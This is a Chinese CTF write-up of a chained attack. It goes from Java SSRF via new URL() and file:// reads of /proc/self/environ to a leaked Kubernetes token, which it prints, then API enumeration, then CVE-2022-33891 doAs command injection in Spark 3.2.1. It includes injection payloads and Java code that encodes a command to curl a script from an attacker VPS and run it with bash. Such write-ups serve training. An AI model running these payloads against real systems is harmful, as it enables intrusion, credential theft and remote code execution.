# Java

## 题目简述

题目入口是一个 Java SSRF 服务，后端用 `new URL()` 解析用户传入的 URL，并把 HTTPS 请求头转发到目标地址。漏洞链路不是单点 RCE，而是先通过 `file://` 任意文件读取拿到 Tomcat 应用包和运行环境，再读取进程环境变量中的 Kubernetes ServiceAccount token，随后访问集群内 `https://127.0.0.1:6443` API 枚举命名空间和 Pod，最终 SSRF 到内网 Spark 3.2.1 服务，利用 CVE-2022-33891 的 `doAs` 参数命令执行读 flag。

## 解题过程

题目的首页是一个SSRF页面，我使用了`new URL()`来设计此漏洞。

首先是一个任意文件读取漏洞，你可以使用如下payload读取源码：

```
file:///usr/local/Tomcat8/webapps/ROOT.war
```

代码关键部分如下：

1. 使用new URL()进行ssrf，过滤了反引号`
2. 使用https访问时，头部信息会被转发

注意：这里的 SSRF 入口依赖 `new URL()` 解析用户输入，后续 payload 的编码层数会受它影响；不能把前端 URL 和后端 Spark URL 当成同一层来处理。

其次，你可以使用如下payload读取系统环境变量：

```shell
file:///proc/self/environ
file:///etc/profile
```

你可以发现有一个k8s账户的token值，被放在了环境变量中，如下图：

```shell
# kube token
TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1IN0RxS0k3U0xhZ1ljYnk1WkE3WE5Mb2dMcVdLOXh5NXVEdmtfc2lKMWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImN0ZmVyLXRva2VuLXB6NWxtIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImN0ZmVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjg2ODY0MTgtOWNiOC00MjZiLThkZmQtNTgxM2E1YTVmMTdiIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6Y3RmZXIifQ.JWwKPAYDMYDmqq-jg9Mzmvil-wG33skSqWsS3_zjv1bLGTRMUvP73w_LsLu7ptRJ1iofTbHBrgRyn01sJ2wjG8f-LruNFWwPj0S6zcGnfYlaUfG70lZIA7otXgEb2pCBzdqrxH4n4PR2aAE5wG-p_uoBjwiShrX-ykfxwErJMnwvJ15OQ57Y87QlZllkaYnvXgg3853qQ5ww414dz4UZ1BL7jXlcCjwbivHMifxMvUAL6GJWY-yoA3hJJBMNz5sjgUz71MXs-0wWLczDk5cv4mbXrjE-mCden5er32ifjsWBx6H_1i5JX6lSt3BP7iUxBQVaqLhnBtYR5nQuFADMFg
```

结合所有信息，你可以构造payload来进行对k8s进行攻击获取信息：

```http
url=https://127.0.0.1:6443/api/v1/namespaces/&Vcode=code....
url=https://127.0.0.1:6443/api/v1/namespaces/ctf/pods&Vcode=code...
```

你会发现一个名为ctf的命名空间，和一个在ctf下的pod，你可以拿到ip和port的信息以及部署名字"spark"：

```json
k:{containerPort:\"8080\"}
"hostIP": "10.12.22.6",
"podIP": "10.244.0.111",
"podIPs": [{"ip": "10.244.0.111"}]
```

最后，你可以通过ip和port信息进行ssrf访问到spark的首页面，并找到spark版本：3.2.1。

CVE-2022-33891 的关键点是 Spark UI 在启用 ACL 且支持用户模拟时会读取 `doAs` 参数；受影响实现把该参数拼到 shell 命令中处理，导致分号或命令替换可以注入额外命令。这里不需要保留外部漏洞文章，只要确认目标 Spark 版本和 `doAs` 行为即可。

Spark UI 相关页面会显示 3.2.1 版本，并且 `doAs` 参数最终进入 bash 命令执行流程，因此可以通过命令分隔符或命令替换触发注入。

所以现在就到了常规的命令执行绕过`(反引号)，一些可行的绕过方法如下：

```shell
?doAs=;command
?doAs=$(command) (write by ADVambystoma)
```

最后就是有很多人共有的问题，对自己的payload进行了两次url编码，导致攻击失败。原因是 Java `new URL()` 在解析和构造请求时会影响路径/查询字符串中的转义字符，前端 SSRF 层和后端 Spark 层又各自消费一次编码，因此实际发送到 Spark 的 `doAs` 必须按链路做二次 URL 编码，否则分号、空格和重定向符号会提前被解析或被过滤。

你可以使用java来构造payload：

```java
# 下载
String a = URLEncoder.encode(";curl http://vps:8888/rev.html>/tmp/rev.sh","utf-8");
String c = URLEncoder.encode(a,"utf-8");
System.out.println(c);
--------------------------------------------------
# 执行
String a = URLEncoder.encode(";bash /tmp/rev.sh","utf-8");
String c = URLEncoder.encode(a,"utf-8");
System.out.println(c);
```

## 方法总结

本题核心是把 Java SSRF 从“能访问 URL”扩展成集群内横向利用链：`file://` 读源码和环境变量，环境变量拿 Kubernetes token，API Server 枚举内网 Pod，再打 Spark UI 的 `doAs` 命令注入。

识别信号是：服务端用 `new URL()` 解析用户输入、HTTPS 请求头会被转发、`/proc/self/environ` 暴露 service account token、内网 6443 端口可达、Spark 版本落在 CVE-2022-33891 影响范围内。

复现时最容易出错的是编码层数。payload 要按“SSRF 服务解析一次、Spark 接收一次”的链路推导，命令中的 `;`、空格、`>` 等字符需要先在 Java 中编码，再对结果继续编码一次。
